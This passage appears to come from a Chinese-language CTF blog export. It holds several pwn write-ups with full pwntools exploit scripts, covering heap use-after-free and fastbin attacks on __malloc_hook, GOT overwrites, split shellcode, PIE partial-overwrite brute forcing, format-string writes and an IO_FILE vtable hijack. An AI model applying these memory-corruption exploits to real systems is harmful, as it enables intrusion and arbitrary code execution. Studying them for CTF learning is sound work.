fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['./lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./lib/libc.so.6\"})\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"119.3.81.43\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\n\ndef write(offset, con):\n    ru(\": \")\n    sl(\"-1\")\n    ru(\": \")\n    sl(str(offset // 4))\n    ru(\":\")\n    sl(str(con))\n\ndef write2(offset, con):\n    ru(\": \")\n    sl(str(0x100000))\n    ru(\": \")\n    sl(str(offset // 4))\n    ru(\":\")\n    sl(str(con))\n\n\nmain_addr = 0x40078D\nputs_got = elf.got['puts']\nsetbuf_got = elf.got['setbuf']\nexit_got = elf.got['exit']\nprintf_plt = elf.plt['printf']\nsetbuf_plt = elf.plt['setbuf']\ncalloc_got = elf.got['calloc']\nsetbuf_init = 0x40086a\n\n\nlog.info(\"puts_got:0x%x\"%puts_got)\nlog.info(\"setbuf_got:0x%x\"%setbuf_got)\nlog.info(\"exit_got:0x%x\"%exit_got)\nlog.info(\"printf_plt:0x%x\"%printf_plt)\nlog.info(\"setbuf_plt:0x%x\"%setbuf_plt)\nlog.info(\"calloc_got:0x%x\"%calloc_got)\n\n\nwrite(puts_got,main_addr) #puts->main\nwrite(setbuf_got,printf_plt) #setbuf->printf\nwrite(setbuf_got+4,\"0\") #setbuf->printf\nwrite(exit_got,setbuf_init) #exit->setbuf\n\n\n# gdb.attach(p, \"b *(0x400854) \\n c\")\nIO_stdin4_mmap = 0x5EC974 #without PIE\nIO_stdin_1_libc = 0x1EBA03\nwrite2(IO_stdin4_mmap,0x11111111) #IO_stdin.flag->0x111111111fbad208b\nsla(': ', str(256))\nleak = u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8, \"\\x00\"))\nlibc_base = leak - IO_stdin_1_libc\nlog.info(\"libc_base:0x%x\"%libc_base)\none_gadget = libc_base + 0xe6c81\n\nru(\": \")\nsl(\"0\")\nru(\":\")\nsl(\"0\")\n\nwrite(calloc_got, one_gadget & 0xffffffff)\nru(\": \")\nsl(str(0))\np.interactive()\n```\n\n2.gift：这道题目我认栽，确实是做题经验少了，忘了利用chunk头+chunk联合fastbin的FILO原则来修改chunk头了。\n\n(1)改chunk头，加上UAF漏洞，利用chunk头里的函数指针和参数，改成printf，直接格式化字符串泄露地址。\n\n(2)同样道理，直接改函数指针指向堆上伪造的system_addr，利用参数/bin/sh直接getshell。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./GIFT\"\nlibc_file = \"/lib/x86_64-linux-gnu/libc-2.23.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \">> \"\n\n\ndef add(size, con):\n    sla(menu, \"1\")\n    sla(\"size: \", str(size))\n    sa(\"content: \", con)\n\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\nadd(0x28, \"\\x00\") #0\nadd(0x28, \"\\x01\") #1\n\ndelete(0)\ndelete(1)\n\nadd(0x18, \"%8$p%9$p\"+\"\\x30\") #2\ndelete(0)\nru(\"0x\")\nheap_base = int(p.recv(12),16)-0x10\nlibc_base = int(p.recv(14),16) - 0x55810\n# li(\"libc_base\", libc_base)\n# li(\"leak\", leak)\nlog.info(\"heap_base:0x%x\"%heap_base)\nlog.info(\"libc_base:0x%x\"%libc_base)\n\nsystem_addr = libc_base + libc.sym['system']\n\nadd(0x38, \"\\x03\") #3\nadd(0x38, \"\\x04\") #4\nadd(0x48,p64(system_addr))#5\n\nheap_system = heap_base+0x50+0x50+0x60+0x60+0x20+0x10\ndelete(3)\ndelete(4)\nadd(0x18,\"/bin/sh\\x00\"+p64(heap_system)) #6\ndelete(3)\np.interactive()\n```\n\n \n\n3.small_chunk：我觉得出得最好的是这道题，确实不错。\n\n(1)首先布局，利用off-by-one制作堆块重叠，然后unsortedbin泄露地址。\n\n(2)由于chunk只能申请0x20和0x30，所以想要打fastbin attack，一般有以下三种方案来绕过：\n\n①调用malloc_consolidate，整理fastbin中的chunk，使得fake_chunk的size变成合法的。这个有三种情况，具体分析，我都尝试了个遍，这里一个也用不了。\n\n②利用unsotedbin attack，不过这个只能针对0x7f的情况，这里不太行。\n\n③利用fastbinY链表，先伪造一个fastbin_chunk的fd为0x21或者0x31，申请回来fastbin_chunk，将0x21或者0x31留到fastbinY链表中，这样在main_arena中就留下了一个0x21或者0x31的数值，就可以利用这个数值伪造size来申请chunk到main_arena。之后0x20和0x30的fastbin打配合，将top_chunk地址改成malloc_hook的地方，再申请就可以申请到malloc_hook了。\n\n需要注意的是，top_chunk改地址，需要绕过一些检测，所以一般两种情况：\n\nA.free_hook-0xb58\n\nB.malloc_hook-0x10\n\n以上两种的size域都是一个libc地址，能够通过检测\n\n这里由于堆块个数不够用，所以选择方案B，修改完malloc_hook为one_gadget后，再申请即可getshell。\n\n▲这里在后面的复现中有点犯蠢，本来想申请到bss段上的，没办法泄露elf基地址。vmmap一看，发现heap_base和bss段固定偏移0x1000，这可给我高兴坏了，直接打bss段的size区域的地方。打完后，关机之后，再打开发现不顶用了。得，ASLR我之前给关了，再开就不是固定偏移了.....\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./small_chunk\"\nlibc_file = \"./libc.so.6\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.23.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \">> \"\n\n\ndef add(size):\n    sla(menu, \"1\")\n    sla(\"size: \", str(size))\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"index: \", str(idx))\n\ndef edit(idx, con):\n    sla(menu, \"4\")\n    sla(\"index: \", str(idx))\n    sa(\"content: \",con)\n\nadd(0x18)#0\nadd(0x18)#1\ndelete(1)\ndelete(0)\nadd(0x18)\nshow(0)\nru(\"content: \")\nheap_base = u64(rc(6).ljust(8,\"\\x00\"))-0x20\nlog.info(\"heap_base:%x\"%heap_base)\nadd(0x18)#1\nchunk2_addr = heap_base+0x40\nlog.info(\"chunk2_addr:%x\"%chunk2_addr)\n\nadd(0x28) #idx2\nadd(0x28) #idx3\nadd(0x28) #idx4\n\nadd(0x28) #idx5\nadd(0x28) #idx6\nadd(0x18) #idx7\n\nadd(0x28) #idx8\nadd(0x28) #idx9\nadd(0x28) #idx10\nedit(2,\np64(0x0)+p64(0x81) #fakechunk.pre_size,fakechunk.size\n+p64(chunk2_addr+0x10)+p64(chunk2_addr+0x10) #fakechunk.fd,fakechunk.bk\n+p64(0x80)+p64(0x31)) #chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10\n#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;\n\n\nedit(4,p64(0x0)*4+p64(0x80)+p64(0xb0)) #chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10\n#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;\ndelete(5)\nadd(0x18) #5\nedit(2,\"A\"*0x10)\nshow(2)\nru(\"content: \")\nrc(0x10)\nmain_arena = u64(rc(6).ljust(8,\"\\x00\"))-88 -0x100-0x20\nmalloc_hook = main_arena-0x10\nlibc_base = malloc_hook-libc.sym['__malloc_hook']\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + libc.sym[\"system\"] #system\nfree_hook_addr = libc_base + libc.sym[\"__free_hook\"]\nmalloc_hook_addr = libc_base +libc.sym[\"__malloc_hook\"]\ntop_addr_main = main_arena+88\none_gadget = libc_base + 0xf1247\n\n\nlog.info(\"free_hook_addr:0x%x\"%free_hook_addr)\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"main_arena:0x%x\"%main_arena)\nlog.info(\"malloc_hook_addr:0x%x\"%malloc_hook_addr)\nadd(0x28) #11\nedit(11,\"/bin/sh\\x00\")\nadd(0x28) #12\nadd(0x28) #13\nadd(0x28) #14\nadd(0x18) #15\ndelete(7)\nedit(15,p64(0x31))\nadd(0x18)#7\ndelete(4)\nedit(12,p64(main_arena))\nadd(0x28)#4\nadd(0x28)#16\nedit(16,p64(main_arena+0x30)+p64(0x0)\n+p64(0x0)*3+p64(0x31))\nadd(0x28)#17\nedit(17,p64(0x0)*3+p64(malloc_hook_addr-0x10))\npause()\nadd(0x28)#18\nadd(0x28)#19\nedit(19,p64(one_gadget))\npause()\nadd(0x28)\np.interactive()\n```\n\n其实这次比赛也学到很多，虽然比赛的时候一道题也没写出来，总的来说还是自己的经验太少。\n\n \n","tags":["比赛"],"categories":["PWN"]},{"title":"CSAW Quals CTF 2017-pilot","url":"/2021/08/14/CSAW Quals CTF 2017-pilot/","content":"\n \n\n1.常规check，发现这破程序啥保护也没开，而且还存在RWX段：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555089.jpeg)\n\n这不瞎搞嘛。之后IDA找漏洞，发现栈溢出：\n\n```\n#注释头\n\nchar buf; // [rsp+0h] [rbp-20h]\nif ( read(0, &buf, 0x40uLL) > 4 )：\n```\n\n2.这里就可以思考下攻击思路，存在栈溢出，还有RWX段，考虑用shellcode。虽然这个RWX段是随机生成的栈，地址没办法确定。再看看程序，发现程序自己给我们泄露了buf的栈地址：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555043.jpeg)\n\n也就是说紧跟再location后面的打印出来的就是buf的真实栈地址，这样我们就可以接受该栈地址，然后用栈溢出使得我们的main函数返回时可以跳转到对应的buf地址上，而buf地址上的内容就是我们的输入，也就是输入的shellcode，这样就可以执行我们的shellcode了。\n\n3.但是写完shellcode会发现程序崩溃，这里进入IDA调试一下shellcode。可以发现程序运行过程中，Main函数return执行之后，跳转到shellcode的地方，然后运行shellcode。但是这一过程中，栈顶指向了main函数return的地址。所以在运行shellcode过程中，由于shellcode中有一个push rbx命令，导致rsp向上移动8个字节会覆盖掉shellcode的首地址。本来这没啥事，毕竟已经进入到shellcode当中去了，但是后面还有push rax和push rdi这两个改变rsp的命令，这就导致了rsp再次向低地址覆盖了16个字节，总共覆盖了24个字节。但是我们输入的shellcode有48个字节，顺序为shellcode+nop*10+addr_shellcode，也就是扣掉最后18个字节，还多出来6个字节覆盖掉了我们的执行代码shellcode的最后6个字节代码，导致我们的shellcode没办法完全执行，最终导致程序出错。\n\n4.由于read函数允许我们输入0x40，也就是64个字节，也就是在覆盖掉返回地址之后，我们还能再输入64-48=16个字节。由于push rdi之后的片段为8个字节(包括了push rdi)，小于16个字节，能够容纳下我们被覆盖掉的shellcode的代码，所以这里我们可以考虑用拼接的方式来把shellcode完美执行。\n\n5.现在考虑如何把两段shellcode汇编代码连在一起。有call,return和jmp，但是前面两条指令中，call会push进函数地址，而return也会修改栈和寄存器的状态，ret指令的本质是pop eip，即把当前栈顶的内容作为内存地址进行跳转。所以只能选择jmp跳转。\n\n6.可以查阅Intel开发者手册或其他资料找到jmp对应的字节码，或者这个程序中带了一条Jmp可以加以利用。为EB，jmp x总共2个字节：EB x.\n\n7.将两段隔开，从push rdi开始，将push rdi和之后的代码都挪到下一个地方。这时第一段shellcode应该是22+2(jmp x)=24个字节，距离下段shellcode的距离应该是48-24=24，也就对应0x18h，所以总的shellcode应该是shellcode1+EB 18h+shellcode2，这样可以顺利执行需要的shellcode。\n\n \n\n \n\n▲jmp的跳转计算距离是从jmp指令下一条开始计算的。\n\n▲shellcode的两段执行：\n\n1.需要泄露地址，读取泄露地址：\n\nA.print io.recvuntil(\"Location:\")#读取到即将泄露地址的地方。\n\nB.shellcode_address_at_stack = int(io.recv()[0:14], 16)#将泄露出来的地址转换为数字流\n\nC.log.info(\"Leak stack address = %x\", shellcode_address_at_stack)#将泄露地址尝试输出，观察是否泄露成功。\n\n2.需要跳转jmp命令或者是return/call，但是return会pop eip，call会push eip，都会修改掉栈中的内容。如果shellcode的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是jmp就不会需要，是直接无条件跳转，所以大多时候选择jmp比较好。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"DefCamp CTF Finals 2016-SMS","url":"/2021/08/14/DefCamp CTF Finals 2016-SMS/","content":"\n1.常规checksec操作，开了PIE和NX，首先shellcode不能用。其次PIE表示地址随机化，也就是没办法覆盖返回地址来直接跳转到我们想要的函数处。IDA打开找漏洞，可以看到在doms函数中的v1的栈地址被传递给set_user和set_sms\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528555.jpeg)\n\n之后set_user中会读取输入保存在S这个栈地址上，然后从s中读取前四十个字节到a1[140]-a1[180]，这个a1就是doms函数中的v1。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528927.jpeg)\n\n再往后看，在set_sms函数中，同样读取1024个字节到S这个栈变量中，并且最后将S的特定长度strncpy给a1，这个特定长度就是a1[180]。所以这里我们可以通过set_user来控制a1[180]，进而控制set_sms函数中strncpy给a1拷贝的长度，也就是doms函数中v1的长度，使其大于v1距离栈底的距离0xc0，从而在doms函数栈中执行栈溢出，而doms函数中的v1也就是a1，是在set_sms中由我们输入到S上的内容拷贝过去的，长度为0x400，完全可控。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527621.jpeg)\n\n另外程序存在后门frontdoor()，只要进入这个函数，再输入binsh字符串就能getshell。\n\n2.所以现存在doms函数栈溢出，后门函数这两个漏洞，但是由于PIE，在程序运行过程中没办法确定frontdoor()的地址，无法直接覆盖doms函数返回地址到达后门函数\n\n3.这里就需要用到内存页的一个知识点，由于一个内存页的大小为0x1000，而frontdoor()函数和dosms函数和main函数等等函数，都在同一个内存页上，所以在64位程序下他们的函数地址都是0x############x***这种类型，前面12位#每次加载都不一样，而后面的三位***不会发生改变，因为都在0x0000563cc913(x)000 - 0x0000563cc913(x+1)000这个内存页上。用IDA打开按ctrl+s可以看到\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527058.png)\n\n这些段都在0x0000563cc913(x)000 - 0x0000563cc913(x+1)000这个内存页上。而开启了PIE程序的，0000563cc913(x)这个数值每次都会变化，但是最后三位是不会改变的，就是固定相对于这个内存页起始位置的偏移。\n\n4.所以覆盖返回地址时，可以想到，dosms函数的返回地址是call dosms下一条指令，也就是在main函数上，而frontdoor函数的地址与main函数的地址都在0x0000563cc913(x)这个内存页上。所以当程序被加载，0x0000563cc913(x)这个数值发生改变时，frontdoor函数和main函数地址中对应的数值也会相应改变，而且都是一样的。这种情况下，就可以通过修改dosms返回地址的后四位，也就是之前的(x)yyy来跳转到frontdoor。\n\n5.如果直接爆破，按照数学期望需要尝试0xffff+1=65535+1这么多次，太巨大。这里又考虑到yyy时不会改变的，所以用IDA可以看到frontdoor函数的后三位地址为900，我们在写payload的时候直接写入即可，就是PIE也不会发生改变。现在唯一不确定的就是(x)yyy中的x。直接爆破就好，平均尝试的数学期望为f+1=16次，也不算太高。\n\n6.所以尝试写payload:\n\n(1)修改set_user中的a1[180]的值：\n\n```\n#注释头\n\ndef setlength():\n    io.recvuntil('> ')\n    payload_setlength = 'a'*40 #padding\n    payload_setlength += '\\xca' \n    io.sendline(payload_setlength)\n```\n\n(2)执行栈溢出，覆盖返回地址的低两个字节为\"\\x(x)9\"和\"\\x01\"(大端序，注意顺序)\n\n```\n#注释头\n\ndef StackOverflow():\n    io.recvuntil('> ')\n    payload_StackOverflow = 'a'*200 #padding\n    payload_StackOverflow += '\\x01\\xa9' \n    #frontdoor的地址后三位是0x900, +1跳过push rbp，影响\n    io.sendline(payload_StackOverflow)\n```\n\n这里跳过push rbp的原因是因为strncpy的关系，如果发送的是\\x00,\\xa9，那么先复制\\x00，则会由于strncpy的机制提前结束复制，造成a9没办法复制进去，从而程序出错。(发送的由于是fget函数，所以会全盘接受，\\x00也会接受，不是读取函数的原因。)而跳过push rbp并不影响frontdoor里面的函数执行，所以不会影响getshell。\n\n(3)由于每次地址随机，所以地址随机成a900的概率为1/16，那么就考虑用自动化来爆破实施：\n\n```\n#注释头\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io.remote(\"127.0.0.1\",0000)\n    setlength()\n    StackOverflow()\n    try:\n        io.recv(timeout = 1) \n        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        sleep(0.1)\n        io.sendline('/bin/sh\\x00')\n        sleep(0.1)\n        io.interactive() #没有EOFError的话就是爆破成功，可以开shell\n        break\n```\n\n▲如果直接process本地则没办法成功运行，需要用socat转发，用127.0.0.1本地连接才可以。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"Format_x86和format_x64","url":"/2021/08/14/Format_x86和format_x64/","content":"\n★32位程序：\n\n1.常规checksec，只开了NX。打开IDA查漏洞，main函数中格式化字符串漏洞：\n\n```\n#注释头\n\nmemset(&buf, 0, 0x12Cu);\nread(0, &buf, 0x12Bu);\nprintf(&buf);\n```\n\n2.这里会有一个重复读取的循环，开shell需要system函数和binsh字符串，这里只有system函数，got和plt都对应有，没有binsh字符串，没有libc。\n\n3.由于printf漏洞，我们可以利用这个漏洞向指定的内存地址写入指定的内容，这里考虑将printf的got中的值更改system函数plt表项的值。原本如果调用printf函数，则相当于执行printf函数的got表中保存的printf函数的真实地址处的代码，更改之后相当于执行system函数plt表地址处的代码，也就相当于调用system函数。原理如下：\n\n原本执行Printf函数：相当于执行printf的执行代码\n\n```\n#注释头\n\nprintf_got_addr:   7Fxxxxxx\n7Fxxxxxx:          printf的执行代码\n```\n\n更改之后：相当于执行jmp system_got代码，那就相当于执行system函数了\n\n```\n#注释头\n\nprintf_got_addr:          08048320(system_plt)\n08048320(system_plt):     jmp system_got\n```\n\n4.那么预想程序总流程如下：第一次读取，输入payload，然后printf执行，将printf的got表更改为system函数plt表。通过while循环，第二次读取，输入binsh字符存入buf中，此时printf(&buf)，相当于system(&buf)，那就相当于system(binsh)，即可直接getshell。\n\n5.编写payload，首先需要计算一下偏移地址，将断点下在call printf上，通过调试能够查看到printf写入栈中的地址距离esp的偏移量为6，所以使用控制字符%n来将printf劫持到system，这里偏移就会成n-1为5。偏移代表的是取参数的时候的偏移量，下面的payload对应的5，6，7，8就对应向地址print_got，print_got+1，print_got+2，print_got+3写入内容。由于是修改地址，所以用%hhn来逐个修改，防止向服务器发送过大数据从而出错。\n\n(1)找到got表和plt表项的值\n\n```\n#注释头\n\nprintf_got = 0x08049778\nsystem_plt = 0x08048320\n```\n\n(2)32位程序，4个字节一个地址，所以需要四个地址：\n\n```\n#注释头\n\npayload = p32(printf_got)\npayload += p32(printf_got+1)\npayload += p32(printf_got+2)\npayload += p32(printf_got+3)\n```\n\n(3)由于是大端序，低地址保存的是高地址的内容，print_got需要保存的应该是system_plt的最后一个字节，也就是0x20。\n\n①由于前面已经输入了p32(printf_got)+p32(printf_got1)+p32(printf_got2)+p32(printf_got3)，这些在没有遇到%之前一定会被打印出来，共计16个字节，而我们需要让它总共打印出0x20个字节，所以我们再打印(0x20-16)个字节。\n\n②同样，由于前面已经打印了0x20个字节，我们总共需要打印0x83个字节，所以应该再让程序打印%(0x83-0x20)个字节，之后道理相同。\n\n```\n#注释头\n\n\npayload += \"%\"\npayload += str(0x20-16)\npayload += \"c%5$hhn\"\n#写入0x20到地址print_got\n\npayload += \"%\"\npayload += str(0x83-0x20)\npayload += \"c%6$hhn\"\n#写入0x83到地址print_got+1\n\npayload += \"%\"\npayload += str(0x104-0x83)\npayload += \"c%7$hhn\"\n#写入0x04到地址print_got+2，0x104被截断为04\n\npayload += \"%\"\npayload += str(0x108-0x104)\npayload += \"c%8$hhn\"\n#写入0x08到地址print_got+3，0x108被截断为08\n```\n\n▲为了便于理解，下面代码也行：\n\n```\n#注释头\n\npayload = p32(printf_got+1) \n#使用hhn写入，分别对应待写入的第3，4，2，1字节\npayload += p32(printf_got)\npayload += p32(printf_got+2)\npayload += p32(printf_got+3)\n\npayload += \"%\"\npayload += str(0x83-16) #被写入的数据，注意四个地址长度是16，需要减掉\npayload += \"c%5$hhn\"\n\npayload += \"%\"\npayload += str(0x120-0x83)\npayload += \"c%6$hhn\"\n\npayload += \"%\"\npayload += str(0x204-0x120) #由于是hhn所以会被截断，只留后两位\npayload += \"c%7$hhn\"\n\npayload += \"%\"\npayload += str(0x208-0x204)\npayload += \"c%8$hhn\"\n```\n\n6.其实可以直接使用类Fmtstr，效果一样，将Payload替换成下列代码即可\n\npayload = fmtstr_payload(5, {printf_got:system_plt})\n\n7.之后再io.sendline('/bin/sh\\x00')，即可getshell\n\n \n\n★64位程序\n\n1.由于64位，传参的顺序为rdi, rsi, rdx, rcx, r8, r9，接下来才是栈，所以偏移量应该是6指向栈顶。之后考虑使用fmtstr来直接构造获取：\n\npayload = fmtstr_payload(6, {printf_got:system_plt})\n\n但是这个方法会出错，因为在这种情况下，我们的地址如下\n\n```\n#注释头\n\nprintf_got = 0x00601020\nsystem_plt = 0x00400460\n```\n\n需要写入地址printf_got的首两位是00，且以p64形式发送，所以先发送的是0x20，0x10，0x60，0x00，0x00.......而Read函数读到0x00就会截断，默认这是字符串结束了，所以之后的都无效了。\n\n2.那么考虑手动方式，将p64(printf_got)放在payload的末尾，这样就只有最后才会读到0x00，其它的有效数据都能读入。\n\n3.使用手动方式就需要再次计算偏移量，我们的payload构成应该是\n\npayload = ”%”+str(system_plt)+”c%8$lln” + p64(printf_got)\n\n这里偏移量为8是因为经过调试发现我们的输入从栈顶开始计算，也就是从栈顶开始，一共输入了\n\n1(%) + 7(0x400460转换成十进制为4195424，也就是7个字节) + 7(“c%8$lln”) + 8(p64_printf_got)=23个字节。\n\n经过计算我们发现，p64前面的字节数为15个字节，不足8的倍数，这样会导致printf_got的最后一个字节20被截断至偏移量为7的位置，从而使得偏移量为8的位置只有6010，导致出错。所以我们需要填充一个字节进去，让它不会被截断。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191543645.png)\n\n```\n#注释头\n\npayload = ”a%” + str(system_plt-1)+”c%8$lln” + p64(printf_got)\n```\n\n加入一个字节a就可以使得在参数偏移量为6和7的位置中不会截断0x601020。同时加入字节a就要使system_plt-1来满足最终打印的字符个数为0x00400460，从而才能成功将0x00400460(system_plt)写入到0x00601020(printf_got)\n\n5.完成payload之后，再次循环进入，输入io.sendline('/bin/sh\\x00')后interactive()即可getshell\n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"HCTF2018_the_end","url":"/2021/08/14/HCTF2018_the_end/","content":"\n1.常规checksec，除了canary之外保护全开。IDA打开找漏洞，没什么漏洞，就是程序会泄露出sleep的地址，然后让我们在任意地方写入5个字节，并且给了libc文件，那么就可以算出libc基地址，版本为2.23。\n\nprintf(\"here is a gift %p, good luck ;)\\n\", &sleep);\n\n2.程序最后调用exit(1337)，两种方法：\n\n(1)exit会无条件通过_IO_2_1_stdout_结构体调用vtable虚表中的_setbuf函数。\n\n(2)exit会通过_IO_2_1_stdout_结构体调用vtable虚表中的_overflow函数，但需要满足以下条件：\n\n```\n#注释头\n\n_IO_FILE_plus._mode <= 0\n_IO_FILE_plus._IO_write_ptr > _IO_FILE_plus._IO_write_base\n```\n\n所以我们伪造的_IO_FILE_plus结构体就需要满足上述条件\n\n(3)exit会调用_rtld_global结构体中的_dl_rtld_lock_recursive函数，不用满足条件。\n\n3.三种方法攻击思路:\n\n(1)由于会调用_setbuf函数，vtable位于libc数据段上不可写部分，无法直接修改vtable对应的_IO_file_jumps中的函数指针。那么可以伪造_IO_2_1_stdout_中的vtable指针，利用2字节修改vtable指针的倒数两个字节，使其指向一个可读可写内存，形成一个fake_IO_file_jumps，然后在该内存对应_setbuf函数偏移处伪造one_gadget地址。\n\n```\nfrom pwn import *\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\np = process('./the_end')\n\nvtable_offset = 0xd8\n_setbuf_offset = 0x58\nfake_vtable_offset = 0x3c5588\n#这个需要自己调试找，并保证偏移_setbuf_offset处修改之后程序不会直接崩溃\n\nsleep_addr = p.recvuntil(', good luck',drop=True).split(' ')[-1] \nlibc_base = long(sleep_addr,16) - libc.symbols['sleep']\n\none_gadget = libc_base + 0xf02b0\n_IO_2_1_stdout_vtable_addr = libc_base + libc.sym['_IO_2_1_stdout_'] + 